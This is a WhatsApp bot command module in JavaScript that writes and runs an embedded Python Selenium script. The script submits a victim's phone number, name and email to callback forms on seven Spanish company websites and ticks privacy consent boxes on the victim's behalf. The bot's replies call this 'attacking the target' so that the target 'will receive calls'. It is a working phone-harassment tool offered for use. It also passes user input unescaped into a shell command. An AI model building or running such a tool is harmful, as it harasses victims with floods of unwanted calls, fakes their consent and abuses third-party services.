const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const util = require('util');
const execPromise = util.promisify(exec);

// Motor Python integrado (7 Webs + Clase Base)
const pythonCode = `
import sys, time, requests
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select

class WebBase:
    def __init__(self, n, u): self.nombre, self.url = n, u
    def click(self, b, x):
        try:
            el = b.find_element(By.XPATH, x)
            b.execute_script("arguments[0].scrollIntoView({block: 'center'});", el)
            b.execute_script("arguments[0].click();", el)
            time.sleep(1)
            return True
        except: return False
    def escribir(self, b, x, t):
        try:
            el = b.find_element(By.XPATH, x)
            el.clear()
            el.send_keys(t)
            return True
        except: return False

class Securitas(WebBase):
    def ejecutar(self, b, n, a, t, e):
        b.get("https://www.securitasdirect.es/")
        time.sleep(2)
        self.click(b, '//*[@id="CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll"]')
        self.escribir(b, '//*[@id="edit-telefono1"]', t)
        return self.click(b, '//*[@id="edit-submit"]')

class Euroinnova(WebBase):
    def ejecutar(self, b, n, a, t, e):
        b.get("https://www.euroinnova.com/")
        time.sleep(2)
        self.click(b, '//*[@id="accept-cookies"]')
        self.click(b, '/html/body/div[2]/div/div[2]/div[2]/button')
        self.escribir(b, '//*[@id="name"]', n); self.escribir(b, '//*[@id="lastname"]', a)
        self.escribir(b, '//*[@id="mail"]', e); self.escribir(b, '//*[@id="tel"]', t)
        self.click(b, '//*[@id="privacidad"]')
        return self.click(b, '//*[@id="btn_enviar"]')

class Jazztel(WebBase):
    def ejecutar(self, b, n, a, t, e):
        b.get("https://llamamegratis.es/jazztel/v2/webphone.html")
        time.sleep(2)
        self.escribir(b, '//*[@id="phoneNumber"]', t)
        self.click(b, '/html/body/div[1]/div[1]/div[2]/div[3]/div/div[2]/form/div/div[3]/div/select/option[2]')
        return self.click(b, '//*[@id="env"]')

class ISalud(WebBase):
    def ejecutar(self, b, n, a, t, e):
        try: return requests.post("https://vsec.es/llamada.php", data={"name":n,"surname":a,"email":e,"number":t}, timeout=5).status_code == 200
        except: return False

class Genesis(WebBase):
    def ejecutar(self, b, n, a, t, e):
        b.get("https://www.genesis.es/modal/c2c")
        time.sleep(2)
        self.click(b, '//*[@id="onetrust-accept-btn-handler"]')
        self.escribir(b, '//*[@id="edit-por-quien-preguntamos-"]', n)
        self.escribir(b, '//*[@id="edit-phone"]', t)
        self.escribir(b, '//*[@id="edit-phone-confirmation"]', t)
        self.click(b, '/html/body/div[1]/div/main/div/div/div/article/div/div/div/div/div/form/section/div/div[7]/div/label')
        return self.click(b, '//*[@id="edit-actions-submit"]')

class Vodafone(WebBase):
    def ejecutar(self, b, n, a, t, e):
        b.get("https://www.vodafone.es/c/empresas/es/marketing-online/")
        time.sleep(2)
        self.click(b, '//*[@id="onetrust-accept-btn-handler"]')
        self.click(b, '/html/body/div[2]/main/div[1]/div/div[2]/div/div/div/section/div/div/div/div/div/a[1]/span[1]')
        self.escribir(b, '//*[@id="phone"]', t)
        try:
            b.execute_script("arguments[0].click();", b.find_element(By.XPATH, '//*[@id="cmb-gdpr"]'))
            b.execute_script("arguments[0].click();", b.find_element(By.XPATH, '//*[@id="cmb-check"]'))
        except: pass
        return self.click(b, '/html/body/div[2]/main/div[14]/div/div/div/span/div/div[2]/div[1]/div/div/form/input[2]')

class Mapfre(WebBase):
    def ejecutar(self, b, n, a, t, e):
        b.get("https://www.mapfre.es/boi/inicio.do?origen=autos_portalmapfre&destino=sgc_new&producto=autos")
        time.sleep(2)
        self.click(b, '//*[@id="onetrust-accept-btn-handler"]')
        self.escribir(b, '//*[@id="nombre"]', n); self.escribir(b, '//*[@id="primer_apellido"]', a)
        self.escribir(b, '//*[@id="tlfn"]', t); self.click(b, '//*[@id="politicaprivacidad"]')
        return self.click(b, '/html/body/div[1]/main/div/div/div[2]/form/fieldset/div[10]/input')

if __name__ == "__main__":
    if len(sys.argv) < 5: sys.exit(1)
    opts = Options()
    opts.add_argument('--headless'); opts.add_argument('--no-sandbox'); opts.add_argument('--disable-dev-shm-usage'); opts.add_argument('--log-level=3')
    opts.page_load_strategy = 'eager'
    ex, webs = 0, [Securitas("",""), Euroinnova("",""), Jazztel("",""), ISalud("",""), Genesis("",""), Vodafone("",""), Mapfre("","")]
    try:
        driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=opts)
        driver.set_page_load_timeout(20)
        for w in webs:
            try:
                if w.ejecutar(driver, sys.argv[2], sys.argv[3], sys.argv[1], sys.argv[4]): ex += 1
            except: pass
        driver.quit()
        print(f"RESULTADO|{ex}|{len(webs)}")
    except Exception as e: print(f"ERROR|{str(e)}")
`;

module.exports = {
    name: 'send',
    // match: detecta si empieza por 'send' ignorando mayúsculas
    match: (text) => text.toLowerCase().trim().startsWith('send'),
    
    execute: async ({ sock, remitente, textoLimpio, msg }) => {
        const args = textoLimpio.trim().split(/\s+/);
        
        // Validación de argumentos: [0]send [1]tel [2]nom [3]ape [4]email
        if (args.length < 5) {
            return sock.sendMessage(remitente, { 
                text: "❌ *Faltan datos*\n\nUso: `send [numero] [nombre] [apellido] [email]`\nEjemplo: `send 600111222 Juan Perez test@gmail.com`" 
            }, { quoted: msg });
        }

        const [_, numero, nombre, apellido, email] = args;

        // Validar número (9 dígitos, empieza por 6, 7 o 9)
        if (!/^[679]\d{8}$/.test(numero)) {
            return sock.sendMessage(remitente, { text: "❌ El número debe tener 9 dígitos y empezar por 6, 7 o 9." });
        }

        const pythonPath = path.join(__dirname, '../perubian_engine.py');
        if (!fs.existsSync(pythonPath)) fs.writeFileSync(pythonPath, pythonCode);

        let statusMsg = await sock.sendMessage(remitente, { 
            text: `⏳ *Atacando objetivo:* ${numero}\n\n_Iniciando ráfaga C2C en la VPS..._` 
        }, { quoted: msg });

        try {
            // Ejecución con timeout de 3 min para no colgar la VPS
            const { stdout } = await execPromise(`python3 "${pythonPath}" "${numero}" "${nombre}" "${apellido}" "${email}"`, { timeout: 180000 });
            
            if (stdout.includes('RESULTADO')) {
                const [__, exitos, total] = stdout.trim().split('|');
                await sock.sendMessage(remitente, { 
                    text: `✅ *Ráfaga C2C Finalizada*\n\n📞 *Número:* ${numero}\n📈 *Éxitos:* ${exitos} de ${total} webs.\n🚀 El objetivo recibirá llamadas en breve.`,
                    edit: statusMsg.key 
                });
            } else {
                throw new Error(stdout || "Fallo en motor Python");
            }
        } catch (e) {
            console.error(e);
            await sock.sendMessage(remitente, { text: `❌ *Error:* ${e.message.substring(0, 100)}`, edit: statusMsg.key });
        }
    }
};
